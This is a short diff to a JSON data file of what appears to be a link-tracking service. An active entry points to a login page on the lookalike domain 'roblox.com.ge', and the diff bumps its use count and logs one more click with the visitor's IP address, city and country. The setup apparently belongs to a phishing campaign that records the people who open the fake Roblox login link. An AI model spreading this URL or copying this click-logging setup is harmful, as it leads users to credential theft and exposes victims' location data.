@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1293,
+    "useCount": 1294,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10488,6 +10488,14 @@
         "city": "Makati City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777371504615,
+        "ip": "196.3.214.17",
+        "country": "Barbados",
+        "city": "Bridgetown",
+        "flag": "🇧🇧",
+        "countryCode": "BB"
       }
     ]
   },
